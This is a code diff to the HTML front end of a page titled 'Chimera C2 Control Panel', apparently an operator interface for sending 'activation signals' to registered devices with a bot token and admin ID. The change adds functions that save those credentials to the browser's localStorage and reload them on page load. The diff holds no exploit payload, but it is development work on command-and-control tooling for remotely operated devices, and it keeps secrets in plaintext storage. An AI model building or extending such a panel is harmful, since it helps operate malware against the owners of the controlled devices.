@@ -17,7 +17,7 @@
         #log { margin-top: 20px; padding: 15px; background: #111; border: 1px solid #333; height: 200px; overflow-y: scroll; white-space: pre-wrap; font-family: "SF Mono", "Fira Code", monospace; border-radius: 8px; }
     </style>
 </head>
-<body>
+<body onload="loadReqInfo()">
     <div class="container">
         <h1>Chimera C2 Control Panel</h1>
         
@@ -43,7 +43,20 @@
             logElement.textContent = message;
             logElement.style.color = isError ? '#ff3b30' : '#f2f2f7';
         };
-
+        function loadReqInfo(){
+            try{
+                bToken = localStorage.getItem("botToken");
+                AId = localStorage.getItem("adminId");
+                document.getElementById('botToken').value = bToken;
+                document.getElementById('adminId').value = AId;
+            }catch(e){
+                log(e);
+                document.getElementById('botToken').value = "";
+                document.getElementById('adminId').value = "";
+            }
+        }
+        
+        
         async function fetchDevices() {
             log('Fetching registered devices...');
             try {
@@ -78,6 +91,9 @@
                 log('Error: Bot Token, Admin ID, and a selected device are required.', true);
                 return;
             }
+            localStorage.setItem("botToken", botToken)
+            localStorage.setItem("adminId", adminId)
+            
 
             log(`Sending activation signal to ${deviceId}...`);
             try {
